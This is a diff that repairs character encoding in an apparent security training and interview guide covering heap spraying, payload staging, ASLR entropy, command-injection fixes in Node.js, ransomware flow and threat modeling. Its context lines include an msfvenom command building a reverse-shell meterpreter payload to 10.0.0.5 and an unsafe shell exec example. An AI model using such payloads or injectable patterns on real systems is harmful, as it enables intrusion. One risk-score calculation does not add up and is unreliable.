@@ -1741,7 +1741,7 @@ SUMMARY: AddressSanitizer: stack-buffer-overflow vuln.c:9 in vulnerable
 - Estimated cost: $100M+ for response
 
 **Lessons:**
-- Code signing â‰  trust
+- Code signing ≠ trust
 - Build environment must be zero-trust secured
 - Software Bill of Materials (SBOM) visibility
 - Network telemetry analysis for beaconing detection
@@ -2762,7 +2762,7 @@ flowchart LR
 
 ---
 
-## Extended Interview Corner (Q13â€“Q20)
+## Extended Interview Corner (Q13–Q20)
 
 ### Q13: Explain heap spraying as an exploitation technique.
 
@@ -2793,7 +2793,7 @@ while (spray.length < 500) {
 | Aspect | Stageless | Staged |
 |--------|-----------|--------|
 | **Single payload** | Contains the full executable code in one shot | Small first-stage downloads larger second-stage |
-| **Size** | Large (200â€“800 bytes) | Small (100â€“300 bytes for stage 1) |
+| **Size** | Large (200–800 bytes) | Small (100–300 bytes for stage 1) |
 | **Reliability** | Self-contained, no network needed post-exploit | Requires network connectivity for stage retrieval |
 | **Detection** | Larger static signature | Stage 1 is small/hard to detect; stage 2 is not in memory initially |
 | **Use case** | Stable exploits, no outbound allowed | Limited buffer space, need flexibility |
@@ -2814,7 +2814,7 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f c
 
 | Component | 32-bit Entropy | 64-bit Entropy |
 |-----------|---------------|----------------|
-| Stack | 19 bits (19â€“24 bits on older kernels) | 22 bits (11 bits on older kernels) |
+| Stack | 19 bits (19–24 bits on older kernels) | 22 bits (11 bits on older kernels) |
 | mmap (shared libraries) | 8 bits (256 positions) + 16 bits possible | 28 bits (on x86_64, 256TB user space) |
 | Heap | 13 bits | 13 bits + 30 bits |
 
@@ -3107,7 +3107,7 @@ try {
 const { exec, execFile, spawn } = require('child_process');
 const path = require('path');
 
-// âŒ UNSAFE: User input directly in shell command
+// ❌ UNSAFE: User input directly in shell command
 function backupUser_raw(username) {
     exec(`tar -czf /backups/${username}.tar.gz /home/${username}`,
          (err, stdout, stderr) => {
@@ -3115,7 +3115,7 @@ function backupUser_raw(username) {
          });
 }
 
-// âœ… SAFE: Whitelist valid usernames
+// ✅ SAFE: Whitelist valid usernames
 const VALID_USERS = new Set(['alice', 'bob', 'charlie']);
 
 function backupUser_safe(username) {
@@ -3129,7 +3129,7 @@ function backupUser_safe(username) {
              });
 }
 
-// âœ… SAFER: Parameterized with spawn
+// ✅ SAFER: Parameterized with spawn
 function backupUser_safer(username) {
     if (!/^[a-zA-Z0-9_]+$/.test(username)) {
         throw new Error('Invalid username format');
@@ -3233,7 +3233,7 @@ sequenceDiagram
     Ransomware->>Victim: Delete shadow copies (vssadmin)
     Ransomware->>Victim: Display ransom note (README.txt)
     Victim->>C2 Server: Visit .onion payment site
-    C2 Server-->>Victim: Request BTC payment ($500â€“$10K)
+    C2 Server-->>Victim: Request BTC payment ($500–$10K)
     Victim-->>C2 Server: Send BTC + victim ID
     Attacker->>C2 Server: Confirm payment
     C2 Server->>Victim: Return RSA-decrypted AES key
@@ -3908,7 +3908,7 @@ cat /proc/self/maps
 
 | Platform | Stack Entropy | Heap Entropy | mmap/libc Entropy | Overall Security |
 |----------|--------------|--------------|-------------------|------------------|
-| Linux x86_64 (kernel â‰¥4.0) | 22 bits | 13 bits | 28 bits | Excellent |
+| Linux x86_64 (kernel ≥4.0) | 22 bits | 13 bits | 28 bits | Excellent |
 | Linux i386 | 19 bits | 8 bits | 8 bits (256 positions) | Moderate |
 | Windows 10 x64 | 19 bits | 5 bits | 8 bits (per session random) | Good |
 | Windows 10 x86 | 17 bits | 5 bits | 8 bits | Moderate |
@@ -4035,8 +4035,8 @@ Stage 6: Attack Modeling
           └── No validation? → Vulnerability!
 
 Stage 7: Risk Scoring
-  [SQL Injection on Login] Damage=10 Ã— Reproducibility=10 Ã— Exploitability=8
-  Likelihood=0.7 Ã— Impact=10 = 56 (CRITICAL)
+  [SQL Injection on Login] Damage=10 × Reproducibility=10 × Exploitability=8
+  Likelihood=0.7 × Impact=10 = 56 (CRITICAL)
   Mitigation: Parameterize all queries
   Residual Risk: MEDIUM (imperfect implementation risk)
 ```
